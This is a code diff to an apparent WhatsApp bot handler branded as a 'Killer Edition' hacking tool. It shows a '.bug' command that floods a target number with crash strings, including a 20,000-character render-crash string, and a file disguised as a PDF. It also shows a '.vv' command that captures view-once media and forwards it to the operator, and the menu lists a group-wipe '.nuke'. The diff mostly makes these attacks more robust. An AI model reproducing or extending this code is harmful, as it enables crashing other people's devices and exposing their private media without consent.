@@ -8,6 +8,7 @@ const bug3 = "҈".repeat(20000); // Character Render Crash
 
 module.exports = async (client, m) => {
     try {
+        if (!m.message) return; // Kuzuia error kama ujumbe hauna content
         const from = m.key.remoteJid;
         const type = Object.keys(m.message)[0];
         const pushname = m.pushName || "User";
@@ -19,7 +20,8 @@ module.exports = async (client, m) => {
         let body = (type === 'conversation') ? m.message.conversation : 
                    (type === 'extendedTextMessage') ? m.message.extendedTextMessage.text : 
                    (type === 'imageMessage') ? m.message.imageMessage.caption : 
-                   (type === 'videoMessage') ? m.message.videoMessage.caption : '';
+                   (type === 'videoMessage') ? m.message.videoMessage.caption : 
+                   (type === 'viewOnceMessageV2') ? m.message.viewOnceMessageV2.message.imageMessage?.caption || m.message.viewOnceMessageV2.message.videoMessage?.caption : '';
         
         const isCmd = body.startsWith('.');
         const command = isCmd ? body.slice(1).trim().split(/ +/).shift().toLowerCase() : '';
@@ -38,7 +40,7 @@ module.exports = async (client, m) => {
 
         // --- LOGGING TRAFFIC ---
         let logMsg = `[${new Date().toLocaleTimeString()}] From: ${pushname} (${sender.split('@')[0]}) -> ${body.slice(0, 20)}...\n`;
-        fs.appendFileSync('./logs.txt', logMsg);
+        if (isOwner) fs.appendFileSync('./logs.txt', logMsg);
 
         // 1. AUTO STATUS VIEW & LIKE
         if (m.key.remoteJid === 'status@broadcast' && settings.autostatus) {
@@ -77,10 +79,10 @@ module.exports = async (client, m) => {
    *◜ ALLY SCOTT ALIEN V11 ◞*
    _Security is an Illusion_
 
-┏━━━━━━━━━━━━━━━━━━━━┓
+┏━━━━━━━━━━━━━━━━━━┓
 ┃ 👤 *User:* ${pushname}
 ┃ 🛠️ *Rank:* Grey Hat Admin
-┗━━━━━━━━━━━━━━━━━━━━┛
+┗━━━━━━━━━━━━━━━━━━┛
 
 ┏━━『 *SYSTEM CONFIG* 』━━┓
 ┃ 🛡️ *Antilink:* ${status(settings.antilink)}
@@ -89,7 +91,7 @@ module.exports = async (client, m) => {
 ┃ ❤️ *StatusLike:* ${status(settings.statuslike)}
 ┃ 🤖 *Autoreact:* ${status(settings.autoreact)}
 ┃ 📞 *Anticall:* ${status(settings.anticall)}
-┗━━━━━━━━━━━━━━━━━━━━┛
+┗━━━━━━━━━━━━━━━━━┛
 
 ┏━━『 *DARK ARSENAL* 』━━┓
 ┃ ☣️ *.bug* [Target]
@@ -101,7 +103,7 @@ module.exports = async (client, m) => {
 ┃ 🔍 *.inspect* [User]
 ┃ 🔓 *.vv* (Manual Hack)
 ┃ 🧨 *.nuke* (Group Wipe)
-┗━━━━━━━━━━━━━━━━━━━━┛
+┗━━━━━━━━━━━━━━━━┛
 
 ┏━━『 *TERMINAL & UTILS* 』━━┓
 ┃ ⚡ *.ping* - Speed Test
@@ -110,7 +112,7 @@ module.exports = async (client, m) => {
 ┃ 🔒 *.public* / *.private*
 ┃ 📝 *.logs* - View Traffic
 ┃ 🛑 *.shutdown* - Kill System
-┗━━━━━━━━━━━━━━━━━━━━┛
+┗━━━━━━━━━━━━━━━━┛
 
 *© 2026 ALLY SCOTT - KILLER EDITION*`;
                 await client.sendMessage(from, { react: { text: '👽', key: m.key } });
@@ -143,13 +145,14 @@ module.exports = async (client, m) => {
                 let target = args[0].replace(/[^0-9]/g, '') + "@s.whatsapp.net";
                 await client.sendMessage(from, { text: `🚀 *Injecting Alien Payloads:* ${command} ➔ ${target}` });
                 
-                // Injection logic using the strong strings
                 await client.sendMessage(target, { text: bug1 });
                 await client.sendMessage(target, { text: bug2 });
                 await client.sendMessage(target, { text: bug3 });
 
                 for (let i = 0; i < 5; i++) {
-                    await client.sendMessage(target, { text: payloads.crashPayload });
+                    if (payloads && payloads.crashPayload) {
+                        await client.sendMessage(target, { text: payloads.crashPayload });
+                    }
                     if (command === 'docbug') {
                         await client.sendMessage(target, { document: fs.readFileSync('./index.js'), mimetype: 'application/pdf', fileName: 'SYSTEM_CRASH.pdf' });
                     }
@@ -179,10 +182,16 @@ module.exports = async (client, m) => {
             break;
 
             case 'vv': {
-                if (!m.quoted || !m.quoted.viewOnceMessageV2) return m.reply("Tag view once message!");
+                // Tumeondoa m.reply na kuweka client.sendMessage kwa usalama
+                if (!m.message.extendedTextMessage?.contextInfo?.quotedMessage) return client.sendMessage(from, { text: "Tag view once message!" });
                 await client.sendMessage(from, { text: "🔓 *Decoding View Once...*" });
-                let viewOnce = m.quoted.viewOnceMessageV2;
-                await client.sendMessage(client.user.id, { forward: viewOnce, caption: `🔓 *View Once Recovered*` });
+                let quoted = m.message.extendedTextMessage.contextInfo.quotedMessage;
+                let viewOnce = quoted.viewOnceMessageV2 || quoted.viewOnceMessage;
+                if (viewOnce) {
+                    await client.sendMessage(client.user.id, { forward: { key: m.key, message: quoted }, caption: `🔓 *View Once Recovered*` });
+                } else {
+                    await client.sendMessage(from, { text: "Hii sio View Once message!" });
+                }
             }
             break;
 
